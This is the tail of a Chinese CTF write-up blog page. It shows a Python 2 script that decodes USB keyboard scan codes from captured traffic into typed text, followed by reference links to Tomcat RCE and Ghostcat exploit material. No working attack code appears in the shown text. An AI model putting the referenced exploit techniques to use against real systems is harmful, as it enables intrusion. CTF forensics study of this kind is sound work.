class=p>:</span><span class=s2>&#34;t&#34;</span><span class=p>,</span> <span class=s2>&#34;18&#34;</span><span class=p>:</span><span class=s2>&#34;u&#34;</span><span class=p>,</span> <span class=s2>&#34;19&#34;</span><span class=p>:</span><span class=s2>&#34;v&#34;</span><span class=p>,</span> <span class=s2>&#34;1a&#34;</span><span class=p>:</span><span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=s2>&#34;1b&#34;</span><span class=p>:</span><span class=s2>&#34;x&#34;</span><span class=p>,</span> <span class=s2>&#34;1c&#34;</span><span class=p>:</span><span class=s2>&#34;y&#34;</span><span class=p>,</span> <span class=s2>&#34;1d&#34;</span><span class=p>:</span><span class=s2>&#34;z&#34;</span><span class=p>,</span><span class=s2>&#34;1e&#34;</span><span class=p>:</span><span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=s2>&#34;1f&#34;</span><span class=p>:</span><span class=s2>&#34;2&#34;</span><span class=p>,</span> <span class=s2>&#34;20&#34;</span><span class=p>:</span><span class=s2>&#34;3&#34;</span><span class=p>,</span> <span class=s2>&#34;21&#34;</span><span class=p>:</span><span class=s2>&#34;4&#34;</span><span class=p>,</span> <span class=s2>&#34;22&#34;</span><span class=p>:</span><span class=s2>&#34;5&#34;</span><span class=p>,</span> <span class=s2>&#34;23&#34;</span><span class=p>:</span><span class=s2>&#34;6&#34;</span><span class=p>,</span><span class=s2>&#34;24&#34;</span><span class=p>:</span><span class=s2>&#34;7&#34;</span><span class=p>,</span><span class=s2>&#34;25&#34;</span><span class=p>:</span><span class=s2>&#34;8&#34;</span><span class=p>,</span><span class=s2>&#34;26&#34;</span><span class=p>:</span><span class=s2>&#34;9&#34;</span><span class=p>,</span><span class=s2>&#34;27&#34;</span><span class=p>:</span><span class=s2>&#34;0&#34;</span><span class=p>,</span><span class=s2>&#34;28&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;RET&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;29&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;ESC&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;2a&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;DEL&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2b&#34;</span><span class=p>:</span><span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;2c&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;SPACE&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;2d&#34;</span><span class=p>:</span><span class=s2>&#34;-&#34;</span><span class=p>,</span><span class=s2>&#34;2e&#34;</span><span class=p>:</span><span class=s2>&#34;=&#34;</span><span class=p>,</span><span class=s2>&#34;2f&#34;</span><span class=p>:</span><span class=s2>&#34;[&#34;</span><span class=p>,</span><span class=s2>&#34;30&#34;</span><span class=p>:</span><span class=s2>&#34;]&#34;</span><span class=p>,</span><span class=s2>&#34;31&#34;</span><span class=p>:</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;32&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;NON&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;33&#34;</span><span class=p>:</span><span class=s2>&#34;;&#34;</span><span class=p>,</span><span class=s2>&#34;34&#34;</span><span class=p>:</span><span class=s2>&#34;&#39;&#34;</span><span class=p>,</span><span class=s2>&#34;35&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;GA&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;36&#34;</span><span class=p>:</span><span class=s2>&#34;,&#34;</span><span class=p>,</span><span class=s2>&#34;37&#34;</span><span class=p>:</span><span class=s2>&#34;.&#34;</span><span class=p>,</span><span class=s2>&#34;38&#34;</span><span class=p>:</span><span class=s2>&#34;/&#34;</span><span class=p>,</span><span class=s2>&#34;39&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;CAP&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3a&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F1&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3b&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F2&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3c&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F3&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3d&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F4&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3e&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F5&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3f&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F6&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;40&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F7&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;41&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F8&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;42&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F9&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;43&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F10&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;44&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F11&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;45&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F12&gt;&#34;</span><span class=p>}</span>
+
+<span class=n>shiftKeys</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;04&#34;</span><span class=p>:</span><span class=s2>&#34;A&#34;</span><span class=p>,</span> <span class=s2>&#34;05&#34;</span><span class=p>:</span><span class=s2>&#34;B&#34;</span><span class=p>,</span> <span class=s2>&#34;06&#34;</span><span class=p>:</span><span class=s2>&#34;C&#34;</span><span class=p>,</span> <span class=s2>&#34;07&#34;</span><span class=p>:</span><span class=s2>&#34;D&#34;</span><span class=p>,</span> <span class=s2>&#34;08&#34;</span><span class=p>:</span><span class=s2>&#34;E&#34;</span><span class=p>,</span> <span class=s2>&#34;09&#34;</span><span class=p>:</span><span class=s2>&#34;F&#34;</span><span class=p>,</span> <span class=s2>&#34;0a&#34;</span><span class=p>:</span><span class=s2>&#34;G&#34;</span><span class=p>,</span> <span class=s2>&#34;0b&#34;</span><span class=p>:</span><span class=s2>&#34;H&#34;</span><span class=p>,</span> <span class=s2>&#34;0c&#34;</span><span class=p>:</span><span class=s2>&#34;I&#34;</span><span class=p>,</span> <span class=s2>&#34;0d&#34;</span><span class=p>:</span><span class=s2>&#34;J&#34;</span><span class=p>,</span> <span class=s2>&#34;0e&#34;</span><span class=p>:</span><span class=s2>&#34;K&#34;</span><span class=p>,</span> <span class=s2>&#34;0f&#34;</span><span class=p>:</span><span class=s2>&#34;L&#34;</span><span class=p>,</span> <span class=s2>&#34;10&#34;</span><span class=p>:</span><span class=s2>&#34;M&#34;</span><span class=p>,</span> <span class=s2>&#34;11&#34;</span><span class=p>:</span><span class=s2>&#34;N&#34;</span><span class=p>,</span> <span class=s2>&#34;12&#34;</span><span class=p>:</span><span class=s2>&#34;O&#34;</span><span class=p>,</span> <span class=s2>&#34;13&#34;</span><span class=p>:</span><span class=s2>&#34;P&#34;</span><span class=p>,</span> <span class=s2>&#34;14&#34;</span><span class=p>:</span><span class=s2>&#34;Q&#34;</span><span class=p>,</span> <span class=s2>&#34;15&#34;</span><span class=p>:</span><span class=s2>&#34;R&#34;</span><span class=p>,</span> <span class=s2>&#34;16&#34;</span><span class=p>:</span><span class=s2>&#34;S&#34;</span><span class=p>,</span> <span class=s2>&#34;17&#34;</span><span class=p>:</span><span class=s2>&#34;T&#34;</span><span class=p>,</span> <span class=s2>&#34;18&#34;</span><span class=p>:</span><span class=s2>&#34;U&#34;</span><span class=p>,</span> <span class=s2>&#34;19&#34;</span><span class=p>:</span><span class=s2>&#34;V&#34;</span><span class=p>,</span> <span class=s2>&#34;1a&#34;</span><span class=p>:</span><span class=s2>&#34;W&#34;</span><span class=p>,</span> <span class=s2>&#34;1b&#34;</span><span class=p>:</span><span class=s2>&#34;X&#34;</span><span class=p>,</span> <span class=s2>&#34;1c&#34;</span><span class=p>:</span><span class=s2>&#34;Y&#34;</span><span class=p>,</span> <span class=s2>&#34;1d&#34;</span><span class=p>:</span><span class=s2>&#34;Z&#34;</span><span class=p>,</span><span class=s2>&#34;1e&#34;</span><span class=p>:</span><span class=s2>&#34;!&#34;</span><span class=p>,</span> <span class=s2>&#34;1f&#34;</span><span class=p>:</span><span class=s2>&#34;@&#34;</span><span class=p>,</span> <span class=s2>&#34;20&#34;</span><span class=p>:</span><span class=s2>&#34;#&#34;</span><span class=p>,</span> <span class=s2>&#34;21&#34;</span><span class=p>:</span><span class=s2>&#34;$&#34;</span><span class=p>,</span> <span class=s2>&#34;22&#34;</span><span class=p>:</span><span class=s2>&#34;%&#34;</span><span class=p>,</span> <span class=s2>&#34;23&#34;</span><span class=p>:</span><span class=s2>&#34;^&#34;</span><span class=p>,</span><span class=s2>&#34;24&#34;</span><span class=p>:</span><span class=s2>&#34;&amp;&#34;</span><span class=p>,</span><span class=s2>&#34;25&#34;</span><span class=p>:</span><span class=s2>&#34;*&#34;</span><span class=p>,</span><span class=s2>&#34;26&#34;</span><span class=p>:</span><span class=s2>&#34;(&#34;</span><span class=p>,</span><span class=s2>&#34;27&#34;</span><span class=p>:</span><span class=s2>&#34;)&#34;</span><span class=p>,</span><span class=s2>&#34;28&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;RET&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;29&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;ESC&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;2a&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;DEL&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2b&#34;</span><span class=p>:</span><span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;2c&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;SPACE&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;2d&#34;</span><span class=p>:</span><span class=s2>&#34;_&#34;</span><span class=p>,</span><span class=s2>&#34;2e&#34;</span><span class=p>:</span><span class=s2>&#34;+&#34;</span><span class=p>,</span><span class=s2>&#34;2f&#34;</span><span class=p>:</span><span class=s2>&#34;{&#34;</span><span class=p>,</span><span class=s2>&#34;30&#34;</span><span class=p>:</span><span class=s2>&#34;}&#34;</span><span class=p>,</span><span class=s2>&#34;31&#34;</span><span class=p>:</span><span class=s2>&#34;|&#34;</span><span class=p>,</span><span class=s2>&#34;32&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;NON&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;33&#34;</span><span class=p>:</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;34&#34;</span><span class=p>:</span><span class=s2>&#34;:&#34;</span><span class=p>,</span><span class=s2>&#34;35&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;GA&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;36&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;&#34;</span><span class=p>,</span><span class=s2>&#34;37&#34;</span><span class=p>:</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;38&#34;</span><span class=p>:</span><span class=s2>&#34;?&#34;</span><span class=p>,</span><span class=s2>&#34;39&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;CAP&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3a&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F1&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3b&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F2&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3c&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F3&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3d&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F4&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3e&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F5&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;3f&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F6&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;40&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F7&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;41&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F8&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;42&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F9&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;43&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F10&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;44&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F11&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;45&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;F12&gt;&#34;</span><span class=p>}</span>
+
+<span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+    <span class=c1># read data</span>
+    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>DataFileName</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>f</span><span class=p>:</span>
+            <span class=n>presses</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
+    <span class=c1># handle</span>
+    <span class=n>result</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+    <span class=k>for</span> <span class=n>press</span> <span class=ow>in</span> <span class=n>presses</span><span class=p>:</span>
+        <span class=n>Bytes</span> <span class=o>=</span> <span class=n>press</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
+        <span class=k>if</span> <span class=n>Bytes</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;00&#34;</span><span class=p>:</span>
+            <span class=k>if</span> <span class=n>Bytes</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=s2>&#34;00&#34;</span><span class=p>:</span>
+                <span class=n>result</span> <span class=o>+=</span> <span class=n>normalKeys</span><span class=p>[</span><span class=n>Bytes</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span><span class=n>lower</span><span class=p>()]</span>
+        <span class=k>elif</span> <span class=n>Bytes</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;20&#34;</span><span class=p>:</span> <span class=c1># shift key is pressed.</span>
+            <span class=k>if</span> <span class=n>Bytes</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=s2>&#34;00&#34;</span><span class=p>:</span>
+                <span class=n>result</span> <span class=o>+=</span> <span class=n>shiftKeys</span><span class=p>[</span><span class=n>Bytes</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span><span class=n>lower</span><span class=p>()]</span>
+        <span class=k>else</span><span class=p>:</span>
+            <span class=k>print</span> <span class=s2>&#34;[-] Unknow Key : </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>Bytes</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>lower</span><span class=p>())</span>
+    <span class=k>print</span> <span class=s2>&#34;[+] Found : </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>result</span><span class=p>)</span>
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+    <span class=n>main</span><span class=p>()</span>
+</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell><span class=nv>$python</span> usb.py
+用proxifier代理python程序到内网
+<span class=c1>#把[]换成{}</span>
+</code></pre></td></tr></table></div></div><h2 id=reference>Reference</h2><p><a href=https://xz.aliyun.com/t/7012 target=_blank rel="noopener noreffer">https://xz.aliyun.com/t/7012</a></p><p><a href=https://blog.csdn.net/sinat_29091823/article/details/72637192 target=_blank rel="noopener noreffer">https://blog.csdn.net/sinat_29091823/article/details/72637192</a></p><p><a href=https://devcentral.f5.com/s/articles/apache-tomcat-remote-code-execution-via-jsp-upload-cve-2017-12615-27957 target=_blank rel="noopener noreffer">https://devcentral.f5.com/s/articles/apache-tomcat-remote-code-execution-via-jsp-upload-cve-2017-12615-27957</a></p><p><a href=https://github.com/00theway/Ghostcat-CNVD-2020-10487/ target=_blank rel="noopener noreffer">https://github.com/00theway/Ghostcat-CNVD-2020-10487/</a></p><p><a href=https://ctf-wiki.github.io/ctf-wiki/misc/traffic/protocols/USB-zh/ target=_blank rel="noopener noreffer">https://ctf-wiki.github.io/ctf-wiki/misc/traffic/protocols/USB-zh/</a></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>本文于 2020-03-09 更新</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2020/03/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=/2020/03/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup/ data-title=高校战“疫”网络安全分享赛部分WriteUp data-hashtags=ctf,writeup,pickle,php,反序列化,soap,渗透,源码审计,metasploit,volatility,usb,wireshark><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=/2020/03/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup/ data-hashtag=ctf><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=/2020/03/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup/ data-title=高校战“疫”网络安全分享赛部分WriteUp><i class="fab fa-weibo fa-fw"></i></a><a href=javascript:void(0); title="分享到 人人" data-sharer=renren data-url=/2020/03/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup/><i class="fab fa-renren fa-fw"></i></a><a href=javascript:void(0); title="分享到 百度" data-sharer=baidu data-url=/2020/03/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup/ data-title=高校战“疫”网络安全分享赛部分WriteUp><i class="loveit it-baidu-fill"></i></a><a href=javascript:void(0); title="分享到 Evernote" data-sharer=evernote data-url=/2020/03/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-%E9%83%A8%E5%88%86writeup/ data-title=高校战“疫”网络安全分享赛部分WriteUp><i class="fab fa-evernote fa-fw"></i></a></span></div></div></div><div class=post-info-more><section><span><a href=/tags/ctf><i class="fas fa-tag fa-fw"></i>ctf</a>
+</span>&nbsp;<span>
+<a href=/tags/writeup><i class="fas fa-tag fa-fw"></i>writeup</a>
+</span>&nbsp;<span>
+<a href=/tags/pickle><i class="fas fa-tag fa-fw"></i>pickle</a>
+</span>&nbsp;<span>
+<a href=/tags/php><i class="fas fa-tag fa-fw"></i>php</a>
+</span>&nbsp;<span>
+<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96><i class="fas fa-tag fa-fw"></i>反序列化</a>
+</span>&nbsp;<span>
+<a href=/tags/soap><i class="fas fa-tag fa-fw"></i>soap</a>
+</span>&nbsp;<span>
+<a href=/tags/%E6%B8%97%E9%80%8F><i class="fas fa-tag fa-fw"></i>渗透</a>
+</span>&nbsp;<span>
+<a href=/tags/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1><i class="fas fa-tag fa-fw"></i>源码审计</a>
+</span>&nbsp;<span>
+<a href=/tags/metasploit><i class="fas fa-tag fa-fw"></i>metasploit</a>
+</span>&nbsp;<span>
+<a href=/tags/volatility><i class="fas fa-tag fa-fw"></i>volatility</a>
+</span>&nbsp;<span>
+<a href=/tags/usb><i class="fas fa-tag fa-fw"></i>usb</a>
+</span>&nbsp;<span>
+<a href=/tags/wireshark><i class="fas fa-tag fa-fw"></i>wireshark</a>
+</span>&nbsp;</section><section><span><a href=javascript:window.history.back();>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/2020/03/vn2020-%E5%85%AC%E5%BC%80%E8%B5%9B-%E8%AE%B0%E4%B8%80%E9%81%93machinelearning%E9%A2%98/ class=prev rel=prev title="[V&N2020 公开赛] 记一道MachineLearning题"><i class="fas fa-angle-left fa-fw"></i>[V&N2020 公开赛] 记一道MachineLearning题</a></div></div><div class=comment></div></article></div></main><footer class=footer><div class=copyright><div class=copyright-line>由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreffer">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a></div><div class=copyright-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2019 - 2020</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>frieggs</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><a href=# class="dynamic-to-top animated faster" id=dynamic-to-top><span>&nbsp;</span>
+</a><script>document.addEventListener('DOMContentLoaded',function(){lightGallery(document.getElementById('content'),{selector:'.lightgallery',speed:400,hideBarsDelay:2000,thumbnail:true,exThumbImage:'data-thumbnail',thumbWidth:80,thumbContHeight:80,});});</script><link rel=stylesheet href=/lib/iconfont/iconfont.min.87733e31cc299c77d28479c59ca286e921fa964f11356559e96012b783b7bb29.css integrity="sha256-h3M+McwpnHfShHnFnKKG6SH6lk8RNWVZ6WASt4O3uyk="><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.a0f67639490aba5d9a250783c0aa0ed69f83a6f151fb0d7b9fb617c9dbc54565.css integrity="sha256-oPZ2OUkKul2aJQeDwKoO1p+DpvFR+w17n7YXydvFRWU="><script src=/lib/smooth-scroll/smooth-scroll.polyfills.min.54590077ee163035c3dd38dc034e9f6915ecbe680dd832f449afa21672cab116.js integrity="sha256-VFkAd+4WMDXD3TjcA06faRXsvmgN2DL0Sa+iFnLKsRY="></script><script src=/lib/sharer/sharer.min.9c88f86c7f0820287113f6236200459832693656e80d7556cc80a93dfbd45813.js integrity="sha256-nIj4bH8IIChxE/YjYgBFmDJpNlboDXVWzICpPfvUWBM="></script><script src=/lib/lazysizes/lazysizes.min.876b4c12685e991d88378c1b6dd3638fd2da0c88f3c24da1ada950c1f26604e1.js integrity="sha256-h2tMEmhemR2IN4wbbdNjj9LaDIjzwk2hralQwfJmBOE="></script><script src=/lib/lightgallery/lightgallery.min.7a84c63ab156d68e4a7269487c9c65a4eb34b0c7864f2d3fd2b87f7c664480d3.js integrity="sha256-eoTGOrFW1o5KcmlIfJxlpOs0sMeGTy0/0rh/fGZEgNM="></script><script src=/lib/lightgallery/lg-thumbnail.min.eab31af8f90835b7ab674b2dd2474841039bc01022aa312f80dde6e22fde58d7.js integrity="sha256-6rMa+PkINberZ0st0kdIQQObwBAiqjEvgN3m4i/eWNc="></script><script src=/lib/lightgallery/lg-zoom.min.e3a7e6bb4a69f8627654ba9e0ab1252971bcfb400538dbb0605db9a3342ce5b9.js integrity="sha256-46fmu0pp+GJ2VLqeCrElKXG8+0AFONuwYF25ozQs5bk="></script><script src=/js/theme.min.1482fc67bfa2c3b8cebe476d0037b9321b5b7a8a1525b547b94143948be90e9e.js integrity="sha256-FIL8Z7+iw7jOvkdtADe5MhtbeooVJbVHuUFDlIvpDp4="></script></body></html>
